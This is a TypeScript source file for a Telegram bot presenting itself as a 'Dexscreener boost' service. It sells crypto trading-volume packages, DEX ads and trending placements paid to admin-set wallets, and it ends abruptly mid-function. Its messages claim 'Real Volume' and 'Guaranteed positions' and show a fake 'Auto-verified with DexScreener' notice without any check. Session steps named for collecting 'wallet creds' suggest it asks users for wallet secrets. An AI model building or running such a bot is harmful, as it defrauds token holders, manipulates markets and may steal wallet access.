import TelegramBot from "node-telegram-bot-api";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { logger } from "./logger.js";

const PUBLIC_DIR = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../public"
);

const IMG_WELCOME = path.join(PUBLIC_DIR, "welcome.jpeg");
const IMG_LOGO    = path.join(PUBLIC_DIR, "dex-logo.jpeg");
const IMG_LOCKER  = path.join(PUBLIC_DIR, "supply-locker.jpeg");
const IMG_BURNER  = path.join(PUBLIC_DIR, "supply-burner.jpeg");

// ─── Types ────────────────────────────────────────────────────────────────────

type SessionStep =
  | "idle"
  | "volume_contract" | "volume_package" | "volume_payment" | "custom_amount"
  | "evm_chain_select"
  | "dex_update_contract"
  | "dex_ads_contract" | "dex_ads_hours" | "dex_ads_group"
  | "dex_trending_contract" | "dex_trending_hours" | "dex_trending_tier" | "dex_trending_group"
  | "lock_contract" | "lock_percent" | "lock_custom_pct" | "lock_duration" | "lock_custom_dur" | "lock_wallet_creds"
  | "burn_contract" | "burn_percent" | "burn_custom_pct" | "burn_wallet_creds";

interface UserSession {
  step: SessionStep;
  tokenData?: TokenInfo;
  selectedPackage?: Package;
  dexHours?: number;
  dexGroup?: string;
  trendingTier?: "top10" | "top3";
  lockPercent?: number;
  lockDuration?: string;
  burnPercent?: number;
  pendingAddress?: string;
  pendingFlow?: string;
}

interface TokenInfo {
  name: string;
  symbol: string;
  chain: string;
  chainEmoji: string;
  address: string;
  price?: string;
  priceRaw?: number;
  marketCap?: number;
  liquidity?: number;
  volume24h?: number;
  bondingCurve?: number;
  status: string;
  dexUrl?: string;
}

interface Package {
  id: string;
  name: string;
  emoji: string;
  solPrice: number;
  bnbPrice: number;
  ethPrice: number;
  tonPrice: number;
  volume: number;
  duration: string;
}

// ─── Config ───────────────────────────────────────────────────────────────────

const PACKAGES: Package[] = [
  { id: "starter", name: "STARTER", emoji: "💎", solPrice: 0.5, bnbPrice: 0.1, ethPrice: 0.1, tonPrice: 0.1, volume: 25_000,  duration: "12h" },
  { id: "basic",   name: "BASIC",   emoji: "📦", solPrice: 1,   bnbPrice: 0.2, ethPrice: 0.2, tonPrice: 0.2, volume: 50_000,  duration: "24h" },
  { id: "bronze",  name: "BRONZE",  emoji: "🥉", solPrice: 2.5, bnbPrice: 0.5, ethPrice: 0.5, tonPrice: 0.5, volume: 125_000, duration: "36h" },
  { id: "premium", name: "PREMIUM", emoji: "🔥", solPrice: 5,   bnbPrice: 1,   ethPrice: 1,   tonPrice: 1,   volume: 250_000, duration: "48h" },
  { id: "vip",     name: "VIP",     emoji: "💎", solPrice: 10,  bnbPrice: 2,   ethPrice: 2,   tonPrice: 2,   volume: 500_000, duration: "72h" },
];

const CHAIN_MAP: Record<string, { label: string; emoji: string; native: string }> = {
  solana:   { label: "Solana",    emoji: "🟣", native: "SOL" },
  ethereum: { label: "Ethereum",  emoji: "Ξ",  native: "ETH" },
  bsc:      { label: "BNB Chain", emoji: "🟡", native: "BNB" },
  base:     { label: "Base",      emoji: "🔵", native: "ETH" },
  ton:      { label: "TON",       emoji: "💎", native: "TON" },
};

const DEXSCREENER_API = "https://api.dexscreener.com";

// ─── Session store ────────────────────────────────────────────────────────────

const sessions = new Map<number, UserSession>();

function getSession(userId: number): UserSession {
  if (!sessions.has(userId)) sessions.set(userId, { step: "idle" });
  return sessions.get(userId)!;
}

function clearSession(userId: number): void {
  sessions.set(userId, { step: "idle" });
}

// ─── Chain detection ──────────────────────────────────────────────────────────

function detectChain(addr: string): "evm" | "ton" | "solana" | null {
  const t = addr.trim();
  if (/^0x[0-9a-fA-F]{40}$/.test(t))            return "evm";
  if (/^(EQ|UQ)[A-Za-z0-9_\-]{46}$/.test(t))   return "ton";
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(t)) return "solana";
  return null;
}

// ─── DexScreener lookup ───────────────────────────────────────────────────────

async function fetchWithTimeout(url: string, timeoutMs = 10000): Promise<Response> {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { signal: controller.signal });
  } finally {
    clearTimeout(id);
  }
}

async function lookupToken(address: string, filterChainId?: string): Promise<TokenInfo | null> {
  const trimmed = address.trim();
  try {
    let pairs: any[] = [];

    // 1. Try DexScreener token endpoint
    const res = await fetchWithTimeout(`${DEXSCREENER_API}/latest/dex/tokens/${trimmed}`);
    if (res.ok) {
      const data = await res.json() as { pairs?: any[] };
      pairs = data.pairs ?? [];
    }

    // 2. Fallback: DexScreener search
    if (!pairs.length) {
      const searchRes = await fetchWithTimeout(`${DEXSCREENER_API}/latest/dex/search?q=${trimmed}`);
      if (searchRes.ok) {
        const searchData = await searchRes.json() as { pairs?: any[] };
        const all = searchData.pairs ?? [];
        pairs = all.filter((p: any) =>
          (p.baseToken?.address ?? "").toLowerCase() === trimmed.toLowerCase() ||
          (p.quoteToken?.address ?? "").toLowerCase() === trimmed.toLowerCase()
        );
      }
    }

    // 3. For Solana addresses: try PumpFun API directly as last resort
    if (!pairs.length && /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed)) {
      try {
        const pfRes = await fetchWithTimeout(
          `https://client-api-2-74b1891ee9f9.herokuapp.com/coins/${trimmed}`, 8000
        );
        if (pfRes.ok) {
          const pf = await pfRes.json() as any;
          if (pf?.mint) {
            const mc  = pf.usd_market_cap ?? 0;
            const bc  = pf.complete ? 100 : Math.min(Math.round(((pf.virtual_sol_reserves ?? 0) / 85_000) * 100), 100);
            return {
              name:         pf.name    ?? "Unknown",
              symbol:       pf.symbol  ?? "???",
              chain:        "Solana",
              chainEmoji:   "🟣",
              address:      trimmed,
              price:        mc > 0 ? `$${(mc / 1_000_000_000).toFixed(8)}` : undefined,
              marketCap:    mc || undefined,
              liquidity:    undefined,
              volume24h:    undefined,
              bondingCurve: bc,
              status:       pf.complete ? "Graduated (Raydium)" : "Active on PumpFun",
              dexUrl:       `https://pump.fun/${trimmed}`,
            };
          }
        }
      } catch { /* PumpFun API unavailable — ignore */ }
    }

    if (!pairs.length) return null;

    // Filter by chain if specified (only if that chain has pairs)
    if (filterChainId) {
      const filtered = pairs.filter((p: any) =>
        (p.chainId ?? "").toLowerCase() === filterChainId.toLowerCase()
      );
      if (filtered.length) pairs = filtered;
    }

    const best = pairs.sort((a, b) => (b.volume?.h24 ?? 0) - (a.volume?.h24 ?? 0))[0];
    const chainId = (best.chainId ?? "unknown") as string;
    const info = CHAIN_MAP[chainId] ?? { label: chainId, emoji: "🌐", native: "?" };

    const priceRaw = best.priceUsd ? parseFloat(best.priceUsd) : undefined;
    const priceStr = priceRaw != null
      ? priceRaw < 0.001
        ? `$${priceRaw.toFixed(8)}`
        : `$${priceRaw.toFixed(4)}`
      : undefined;

    const marketCap = best.marketCap ?? best.fdv;
    const liquidity = best.liquidity?.usd;
    const vol24h    = best.volume?.h24;

    let bondingCurve: number | undefined;
    if (chainId === "solana" && liquidity) {
      const isPump = (best.url ?? "").toLowerCase().includes("pump") ||
                     (best.dexId ?? "").toLowerCase().includes("pump");
      if (isPump) {
        bondingCurve = Math.min(Math.round((liquidity / 85_000) * 100), 100);
      }
    }

    return {
      name:       best.baseToken?.name   ?? "Unknown",
      symbol:     best.baseToken?.symbol ?? "???",
      chain:      info.label,
      chainEmoji: info.emoji,
      address:    trimmed,
      price:      priceStr,
      priceRaw,
      marketCap,
      liquidity,
      volume24h:  vol24h,
      bondingCurve,
      status:     "Active Trading",
      dexUrl:     best.url,
    };
  } catch (err) {
    logger.warn({ err }, "Token lookup failed");
    return null;
  }
}

async function fetchBoosts(endpoint: string): Promise<any[]> {
  try {
    const res = await fetchWithTimeout(`${DEXSCREENER_API}${endpoint}`);
    if (!res.ok) return [];
    const data = await res.json() as any;
    return Array.isArray(data) ? data : [];
  } catch {
    return [];
  }
}

// ─── Formatting helpers ───────────────────────────────────────────────────────

function fmtUsd(n: number): string {
  if (n >= 1_000_000) return `$${(n / 1_000_000).toFixed(2)}M`;
  if (n >= 1_000)     return `$${(n / 1_000).toFixed(2)}K`;
  return `$${n.toFixed(2)}`;
}

function fmtVol(n: number): string {
  if (n >= 1_000_000) return `$${(n / 1_000_000).toFixed(2)}M`;
  if (n >= 1_000)     return `$${(n / 1_000).toFixed(2)}K`;
  return `$${n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function progressBar(pct: number, width = 10): string {
  const filled = Math.round((pct / 100) * width);
  return "▓".repeat(filled) + "░".repeat(width - filled);
}

function addrShort(a: string): string {
  if (a.length <= 16) return a;
  return `${a.slice(0, 8)}...${a.slice(-8)}`;
}

function getWallet(chainType: string): string {
  if (chainType === "ton")    return process.env["PAYMENT_WALLET_TON"] ?? "YOUR_TON_WALLET_ADDRESS";
  if (chainType === "evm")    return process.env["PAYMENT_WALLET_EVM"] ?? process.env["PAYMENT_WALLET_ETH"] ?? process.env["PAYMENT_WALLET_BNB"] ?? "YOUR_EVM_WALLET_ADDRESS";
  return process.env["PAYMENT_WALLET_SOL"] ?? "YOUR_SOL_WALLET_ADDRESS";
}

function chainTypeFor(token: TokenInfo): string {
  const c = token.chain.toLowerCase();
  if (c.includes("ton"))                                       return "ton";
  if (c.includes("bnb") || c.includes("ethereum") || c.includes("base")) return "evm";
  return "solana";
}

function nativeSymbolFor(token: TokenInfo): string {
  const c = token.chain.toLowerCase();
  if (c.includes("ton"))                               return "TON";
  if (c.includes("bnb"))                               return "BNB";
  if (c.includes("ethereum") || c.includes("base"))   return "ETH";
  return "SOL";
}

function adsRateFor(token: TokenInfo): { rate: number; minHours: number; native: string } {
  const isEth = token.chain.toLowerCase().includes("ethereum") || token.chain.toLowerCase().includes("base");
  return isEth
    ? { rate: 0.4, minHours: 1, native: "ETH" }
    : { rate: 0.8, minHours: 3, native: nativeSymbolFor(token) };
}

function getPkgPrice(pkg: Package, token: TokenInfo): string {
  const c = token.chain.toLowerCase();
  if (c.includes("ton"))                              return `${pkg.tonPrice} TON`;
  if (c.includes("bnb"))                              return `${pkg.bnbPrice} BNB`;
  if (c.includes("ethereum") || c.includes("base"))  return `${pkg.ethPrice} ETH`;
  return `${pkg.solPrice} SOL`;
}

// ─── Token verification result text ──────────────────────────────────────────

function tokenVerifyText(t: TokenInfo): string {
  const mc  = t.marketCap ? fmtUsd(t.marketCap) : "—";
  const vol = t.volume24h ? fmtVol(t.volume24h) : "—";
  const bc  = t.bondingCurve != null ? `📊 Bonding Curve: ${t.bondingCurve}%` : null;
  return [
    `✅ Token Verification Results`,
    ``,
    `🎯 Token: ${t.symbol}`,
    `📋 Name: ${t.name}`,
    `${t.chainEmoji} Chain: ${t.chain}`,
    `📍 CA: ${addrShort(t.address)}`,
    `💰 Market Cap: ${mc}`,
    bc,
    `💲 Price: ${t.price ?? "—"}`,
    `📈 24h Volume: ${vol}`,
    `🟢 Status: ${t.status}`,
    `🔗 Source: DexScreener`,
    ``,
    `✅ Token data retrieved successfully!`,
  ].filter(v => v !== null).join("\n");
}

// ─── Message texts ────────────────────────────────────────────────────────────

function volumePackagesText(): string {
  return `📦 Premium Volume Packages

🔥 Choose Your Perfect Package:

💎 STARTER
• ⊙ SOL: 0.5 SOL → 25,000 Volume (12h)
• ⬡ BNB / 💎 TON: 0.1 native → 2,500 Volume (12h)
• Ξ ETH / 🔷 Base: 0.1 native → 5,000 Volume (12h)

📦 BASIC
• ⊙ SOL: 1 SOL → 50,000 Volume (24h)
• ⬡ BNB / 💎 TON: 0.2 native → 5,000 Volume (24h)
• Ξ ETH / 🔷 Base: 0.2 native → 10,000 Volume (24h)

🥉 BRONZE
• ⊙ SOL: 2.5 SOL → 125,000 Volume (36h)
• ⬡ BNB / 💎 TON: 0.5 native → 20,000 Volume (36h)
• Ξ ETH / 🔷 Base: 0.5 native → 25,000 Volume (36h)

🔥 PREMIUM
• ⊙ SOL: 5 SOL → 250,000 Volume (48h)
• ⬡ BNB / 💎 TON / Ξ ETH / 🔷 Base: 1 native → 50,000 Volume (48h)

💎 VIP
• ⊙ SOL: 10 SOL → 500,000 Volume (72h)
• ⬡ BNB / 💎 TON / Ξ ETH / 🔷 Base: 2 native → 100,000 Volume (72h)

🎯 CUSTOM - Your Amount
• 50,000 volume per native token
• Flexible duration`;
}

function dexServicesText(): string {
  return `🎯 Professional DEX Services

🌐 All Chains Supported: ⊙ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON

🔥 Boost Your Token's Visibility:

📊 DEX UPDATE - $299 USD
• ~3.2879 SOL / ~0.1328 ETH / ~0.4468 BNB
• Update token information
• Logo, description, links
• Enhanced visibility
• Professional profile

📣 DEX ADS
• ⊙ SOL / ⬡ BNB / 💎 TON: 0.8 native/hour (min 3h)
• Ξ ETH / 🔷 Base: 0.4 ETH/hour (min 1h)
• Premium ad placement
• Featured positioning
• Maximum exposure

🔥 DEX TRENDING
• 🥉 Top 10: 0.5 native/hour (min 3h)
• 🥇 Top 3: 1 native/hour (min 1h)
• Guaranteed positions

🎯 COMBO DEALS
• Save 20% on multiple services
• Package discounts available`;
}

function helpText(): string {
  return `🦅 Dexscreener boost — Help

/start — 🏠 Open main menu
/volume — 📦 View all volume packages
/latest — 📰 Latest boosted tokens
/top — 🏆 Top boosted tokens
/golden — 🌟 Golden Ticker tokens (500+ boosts)
/chains — 🌐 Supported chains info
/help — ❓ Help guide
/cancel — ❌ Cancel current session

Quick Start:
1. Tap "🚀 Start Volume Bot"
2. Paste your token contract address
3. Choose a package
4. Send payment → Launch!`;
}

function chainsText(): string {
  return `🦅 Dexscreener boost — Chains

⊙ Solana — 32–44 Base58 chars
Ξ Ethereum — 0x + 40 hex
⬡ BNB Chain — 0x + 40 hex
🔷 Base — 0x + 40 hex
💎 TON — EQ/UQ + 46 chars`;
}

function formatBoostToken(t: any, rank?: number): string {
  const chainInfo = CHAIN_MAP[t.chainId] ?? { label: t.chainId, emoji: "🌐", native: "?" };
  const addr      = `${(t.tokenAddress ?? "").slice(0, 8)}...${(t.tokenAddress ?? "").slice(-6)}`;
  const rankStr   = rank != null ? `#${rank} ` : "";
  const golden    = (t.totalAmount ?? 0) >= 500 ? " 🌟" : "";
  const amount    = (t.amount ?? 0).toLocaleString();
  const total     = (t.totalAmount ?? 0).toLocaleString();
  const urlLine   = t.url ? `View on DexScreener: ${t.url}` : null;
  return [
    `${rankStr}${chainInfo.emoji} ${addr}${golden}`,
    `🔥 Boost: ${amount} / ${total} total`,
    t.description ? `📝 ${t.description.slice(0, 80)}` : null,
    urlLine,
  ].filter(Boolean).join("\n");
}

// ─── Keyboards ────────────────────────────────────────────────────────────────

const KB_MAIN = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "🚀 Start Volume Bot",  callback_data: "start_volume"    },
     { text: "◼️ Stop Volume Bot",   callback_data: "stop_volume"     }],
    [{ text: "📦 Volume Packages",   callback_data: "volume_packages" },
     { text: "🎯 DEX Services",      callback_data: "dex_services"    }],
    [{ text: "🔒 Lock Supply",       callback_data: "lock_supply"     },
     { text: "🔥 Burn Token",        callback_data: "burn_token"      }],
  ],
});

const KB_CANCEL = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel" }]],
});

const KB_SKIP_CANCEL = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "⏭ Skip",   callback_data: "skip_group" }],
    [{ text: "❌ Cancel", callback_data: "cancel"     }],
  ],
});

const KB_BACK_MAIN = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [[{ text: "⬅️ Back to Main", callback_data: "back_main" }]],
});

const KB_PACKAGES = (withBack = false): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "💎 Starter - 0.5 SOL", callback_data: "pkg_starter" },
     { text: "📦 Basic - 1 SOL",    callback_data: "pkg_basic"   }],
    [{ text: "🥉 Bronze - 2.5 SOL", callback_data: "pkg_bronze"  },
     { text: "🔥 Premium - 5 SOL",  callback_data: "pkg_premium" }],
    [{ text: "💎 VIP - 10 SOL",     callback_data: "pkg_vip"     },
     { text: "🎯 Custom Package",   callback_data: "pkg_custom"  }],
    withBack
      ? [{ text: "⬅️ Back to Main", callback_data: "back_main" }]
      : [{ text: "❌ Cancel",        callback_data: "cancel"    }],
  ],
});

const KB_LOCK_PCT = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "25%",        callback_data: "lock_pct_25"     }, { text: "50%",  callback_data: "lock_pct_50"  }],
    [{ text: "75%",        callback_data: "lock_pct_75"     }, { text: "100%", callback_data: "lock_pct_100" }],
    [{ text: "✏️ Custom",  callback_data: "lock_pct_custom" }],
    [{ text: "❌ Cancel",  callback_data: "cancel"          }],
  ],
});

const KB_LOCK_DUR = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "1 Month",   callback_data: "lock_dur_1m"     }, { text: "3 Months", callback_data: "lock_dur_3m" }],
    [{ text: "6 Months",  callback_data: "lock_dur_6m"     }, { text: "1 Year",   callback_data: "lock_dur_1y" }],
    [{ text: "✏️ Custom", callback_data: "lock_dur_custom" }],
    [{ text: "❌ Cancel",  callback_data: "cancel"         }],
  ],
});

const KB_BURN_PCT = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "25%",       callback_data: "burn_pct_25"     }, { text: "50%",  callback_data: "burn_pct_50"  }],
    [{ text: "75%",       callback_data: "burn_pct_75"     }, { text: "100%", callback_data: "burn_pct_100" }],
    [{ text: "✏️ Custom", callback_data: "burn_pct_custom" }],
    [{ text: "❌ Cancel",  callback_data: "cancel"         }],
  ],
});

const KB_DEX_SERVICES = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "📊 DEX Update -...", callback_data: "dex_update"  },
     { text: "📣 DEX Ads",        callback_data: "dex_ads"      }],
    [{ text: "🔥 DEX Trending",   callback_data: "dex_trending" }],
    [{ text: "⬅️ Back to Main",   callback_data: "back_main"    }],
  ],
});

const KB_EVM_CHAIN = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "Ξ Ethereum",  callback_data: "evm_chain_ethereum" },
     { text: "⬡ BNB Chain", callback_data: "evm_chain_bsc"     }],
    [{ text: "🔷 Base",     callback_data: "evm_chain_base"    }],
    [{ text: "❌ Cancel",   callback_data: "cancel"            }],
  ],
});

const KB_TRENDING_TIER = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "🥉 Top 10 Trending", callback_data: "trending_top10" }],
    [{ text: "🥇 Top 3 Trending",  callback_data: "trending_top3"  }],
    [{ text: "❌ Cancel",           callback_data: "cancel"         }],
  ],
});

const KB_PAYMENT = (): TelegramBot.InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "✅ Payment Sent - Activate Service", callback_data: "payment_sent" }],
    [{ text: "❌ Cancel Order",                    callback_data: "cancel"       }],
  ],
});

// ─── Photo helper ─────────────────────────────────────────────────────────────

async function sendPhoto(
  bot: TelegramBot,
  chatId: number | string,
  photoPath: string,
  caption: string,
  opts: TelegramBot.SendPhotoOptions = {}
): Promise<void> {
  try {
    await bot.sendPhoto(chatId, photoPath, { caption, parse_mode: "Markdown", ...opts });
  } catch {
    try {
      await bot.sendMessage(chatId, caption, { parse_mode: "Markdown", ...(opts as any) });
    } catch {
      const plain = caption.replace(/[_*`\[\]]/g, "");
      await bot.sendMessage(chatId, plain, opts as any);
    }
  }
}

async function sendMsg(
  bot: TelegramBot,
  chatId: number | string,
  text: string,
  opts: TelegramBot.SendMessageOptions = {}
): Promise<TelegramBot.Message> {
  try {
    return await bot.sendMessage(chatId, text, { parse_mode: "Markdown", ...opts });
  } catch {
    const plain = text.replace(/[_*`\[\]]/g, "");
    return await bot.sendMessage(chatId, plain, opts);
  }
}

// ─── Bot entry point ─────────────────────────────────────────────────────────

export function startTelegramBot(token: string): TelegramBot {
  const bot = new TelegramBot(token, { polling: true });
  const adminChatId = process.env["ADMIN_CHAT_ID"];

  async function notifyAdmin(text: string): Promise<void> {
    if (!adminChatId) return;
    try { await bot.sendMessage(adminChatId, text, { parse_mode: "Markdown" }); } catch {}
  }

  logger.info("Telegram bot starting");

  bot.setMyCommands([
    { command: "start",  description: "🏠 Open main menu"            },
    { command: "volume", description: "📦 Volume packages & pricing" },
    { command: "latest", description: "📰 Latest boosted tokens"     },
    { command: "top",    description: "🏆 Top boosted tokens"        },
    { command: "golden", description: "🌟 Golden Ticker tokens"      },
    { command: "chains", description: "🌐 Supported chains & info"   },
    { command: "help",   description: "❓ Help guide"                },
    { command: "cancel", description: "❌ Cancel current session"    },
  ]).catch(() => {});

  // ── Send main menu ────────────────────────────────────────────────────────
  async function sendMainMenu(chatId: number | string): Promise<void> {
    clearSession(Number(chatId));
    await sendPhoto(
      bot, chatId, IMG_WELCOME,
      `🚀 DEX Volume Bot - Multi-Chain Elite Volume Booster\n\n💎 Real Volume • Whale Attraction • Instant DEX Ranking\n\n🌐 Supported Chains:\n⊙ Solana  •  Ξ Ethereum  •  ⬡ BNB Chain  •  🔷 Base  •  💎 TON\n\n🎯 Why Whales Choose Volume-Rich Tokens:\n• Trending tokens get premium attention from big Banks\n• Consistent activity signals project legitimacy\n• DEX algorithms favor high-volume tokens in recommendations`,
      { reply_markup: KB_MAIN() }
    );
  }

  // ── EVM chain disambiguation ──────────────────────────────────────────────
  async function askEvmChain(chatId: number | string, userId: number, address: string, flow: string): Promise<void> {
    const session = getSession(userId);
    session.step = "evm_chain_select";
    session.pendingAddress = address;
    session.pendingFlow = flow;
    const short = `${address.slice(0, 10)}...${address.slice(-8)}`;
    await bot.sendMessage(
      chatId,
      `🔗 Select Chain for this Token\n\n📍 Address: ${short}\n\nThis looks like an EVM address. Which chain?`,
      { reply_markup: KB_EVM_CHAIN() }
    );
  }

  // ── Verify token then call next ───────────────────────────────────────────
  async function verifyAndContinue(
    chatId: number,
    userId: number,
    address: string,
    onSuccess: (info: TokenInfo) => Promise<void>,
    flow: string,
    filterChainId?: string
  ): Promise<void> {
    const trimmed = address.trim();
    const chainType = detectChain(trimmed);

    if (!chainType) {
      await bot.sendMessage(
        chatId,
        `❌ Invalid contract address format.\n\n📋 Supported formats:\n• Solana: 32–44 chars (Base58)\n• EVM (ETH/BSC/Base): 0x + 40 hex\n• TON: EQ/UQ + 46 chars`,
        { reply_markup: KB_CANCEL() }
      );
      return;
    }

    // EVM: show loading + auto-verified message, then ask which chain (unless we already know)
    if (chainType === "evm" && !filterChainId) {
      const loading = await bot.sendMessage(chatId, "⏳ Loading contract address...\n⚡ Auto-verified with DexScreener");
      try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
      await askEvmChain(chatId, userId, trimmed, flow);
      return;
    }

    // Solana: try PumpFun + DexScreener (no chain filter — broadest search)
    if (chainType === "solana" && !filterChainId) {
      const loadingPump = await bot.sendMessage(chatId, "🔍 Checking PumpFun...");
      const pumpInfo = await lookupToken(trimmed); // no filter — finds any chain/dex
      try { await bot.deleteMessage(chatId, loadingPump.message_id); } catch {}

      if (pumpInfo) {
        await bot.sendMessage(chatId, `⚡ Auto-verified with DexScreener`);
        getSession(userId).tokenData = pumpInfo;
        await notifyAdmin(`🔍 *Token Verified*\n\nUser: ${userId}\nToken: ${pumpInfo.symbol} (${pumpInfo.chain})\nCA: \`${pumpInfo.address}\`\nMC: ${pumpInfo.marketCap ? fmtUsd(pumpInfo.marketCap) : "—"}\nStatus: ${pumpInfo.status}`);
        await onSuccess(pumpInfo);
        return;
      }

      // Not found anywhere — ask user which chain/platform
      getSession(userId).pendingAddress = trimmed;
      getSession(userId).pendingFlow = flow;
      getSession(userId).step = "evm_chain_select";
      const short = `${trimmed.slice(0, 10)}...${trimmed.slice(-8)}`;
      await bot.sendMessage(
        chatId,
        `🔗 Token not found automatically.\n\n📍 Address: ${short}\n\nPlease select the chain this token is on:`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "⊙ Solana (Raydium/Other)", callback_data: "evm_chain_solana" },
               { text: "Ξ Ethereum",               callback_data: "evm_chain_ethereum" }],
              [{ text: "⬡ BNB Chain",              callback_data: "evm_chain_bsc" },
               { text: "🔷 Base",                  callback_data: "evm_chain_base"    }],
              [{ text: "💎 TON",                   callback_data: "evm_chain_ton"     },
               { text: "❌ Cancel",                callback_data: "cancel"            }],
            ],
          },
        }
      );
      return;
    }

    const loading = await bot.sendMessage(chatId, "⏳ Verifying token on DexScreener...");
    const tokenInfo = await lookupToken(trimmed, filterChainId);
    try { await bot.deleteMessage(chatId, loading.message_id); } catch {}

    if (!tokenInfo) {
      await bot.sendMessage(
        chatId,
        `❌ Token not found on DexScreener.\n\nMake sure:\n• The contract address is correct\n• The token has active trading pairs\n• The token is listed on DexScreener\n\nThen try again.`,
        { reply_markup: KB_CANCEL() }
      );
      return;
    }

    getSession(userId).tokenData = tokenInfo;
    await notifyAdmin(`🔍 *Token Verified*\n\nUser: ${userId}\nToken: ${tokenInfo.symbol} (${tokenInfo.chain})\nCA: \`${tokenInfo.address}\`\nMC: ${tokenInfo.marketCap ? fmtUsd(tokenInfo.marketCap) : "—"}\nFlow: ${flow}`);
    await onSuccess(tokenInfo);
  }

  // ── Volume Bot flow ────────────────────────────────────────────────────────

  async function startVolumeStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "volume_contract";
    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `🚀 Volume Bot — Whale Attraction Protocol\n\n📊 Progress: 33%\n${progressBar(33)}\nStep 1/3: Token Verification\n\n🌐 Supported Chains:\n⊙ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON\n\n📍 Enter Your Token Contract Address:\n\n📋 Supported formats:\n• Solana: 32-44 chars (Base58)\n• EVM (ETH/BSC/Base): 0x + 40 hex\n• TON: EQ/UQ + 46 chars`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendVolumeStep2(chatId: number | string, t: TokenInfo): Promise<void> {
    const verifyTxt = tokenVerifyText(t);
    await sendMsg(
      bot, chatId,
      `${verifyTxt}\n\n📊 Progress: 67%\n${progressBar(67)}\nStep 2/3: Package Selection\n\n🎯 Choose your volume package:`,
      { reply_markup: KB_PACKAGES() }
    );
  }

  async function sendVolumeStep3(chatId: number | string, userId: number, t: TokenInfo, pkg: Package): Promise<void> {
    const session = getSession(userId);
    session.step = "volume_payment";
    session.selectedPackage = pkg;
    const chainType = chainTypeFor(t);
    const priceStr  = getPkgPrice(pkg, t);
    const wallet    = getWallet(chainType);
    const native    = nativeSymbolFor(t);
    const mc        = t.marketCap ? fmtUsd(t.marketCap) : "—";

    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `🦅 Dexscreener boost\n\n📊 Progress: 100%\n${progressBar(100)}\nStep 3/3: Payment & Activation\n\n${t.chainEmoji} Chain: ${t.chain}\n🎯 Token: ${t.symbol} (${mc})\n${pkg.emoji} Package: ${pkg.name}\n💰 Volume: ${pkg.volume.toLocaleString()}\n⏰ Duration: ${pkg.duration}\n💵 Investment: ${priceStr}\n\n💰 Send *${priceStr}* to the address below:\n\n⚠️ After payment, confirm below:`,
      { reply_markup: KB_PAYMENT() }
    );
    await bot.sendMessage(chatId, `\`${wallet}\``, { parse_mode: "Markdown" });
    await notifyAdmin(`🚀 *Volume Bot Order*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nPackage: ${pkg.name}\nPrice: ${priceStr}\nNative: ${native}`);
  }

  // ── DEX Update flow ────────────────────────────────────────────────────────

  async function startDexUpdateStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "dex_update_contract";
    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `🎯 DEX UPDATE SERVICE\n💰 Price: $299 USD (paid in chain native token)\n\n📊 Progress: 17%\n${progressBar(17)}\nStep 1/6: Token Contract Address\n\n🌐 Supported: ⊙ SOL • Ξ ETH • ⬡ BNB • 🔷 Base • 💎 TON\n\n✨ Includes: Logo • Description • Website • Socials • Banner\n\n🔍 Please provide your token contract address:\n⚡ Auto-verified with DexScreener`,
      { reply_markup: KB_CANCEL() }
    );
  }

  // ── DEX Ads flow ──────────────────────────────────────────────────────────

  async function startDexAdsStep1(chatId: number | string, userId: number): Promise<void> {
    getSession(userId).step = "dex_ads_contract";
    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `📣 DEX Ads Service\n\n📍 Step 1/5: Token Contract Address\n\n✨ Includes: Featured placement • Custom banners • Targeted campaigns\n\n💰 Pricing:\n• ⊙ SOL / ⬡ BNB / 💎 TON: 0.8 native/hour (min 3h)\n• Ξ ETH / 🔷 Base: 0.4 ETH/hour (min 1h)\n\n🔍 Provide your token contract address:\n⚡ Auto-verified with DexScreener`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendDexAdsStep2(chatId: number | string, t: TokenInfo): Promise<void> {
    const { rate, minHours, native } = adsRateFor(t);
    const verifyTxt = tokenVerifyText(t);
    await sendPhoto(
      bot, chatId, IMG_LOGO,
      `${verifyTxt}\n\n📍 Step 2/5: Campaign Duration\n\n⏰ Minimum Duration: ${minHours} hours\n💰 Rate: ${rate} ${native}/hour\n\nHow many hours do you want the ad campaign to run?`,
      { reply_markup: KB_CANCEL() }
    );
  }

  async function sendDexAdsStep3(chatId: number | string, t: TokenInfo, hours: number): Promise<void> {
    const { rate, native } = adsRateFor(t);
    const mc = t.marketCap ? fmtUsd(t.marketCap) : "—";
    await sendPhoto(
      bot, chatId, IMG_LOGO,
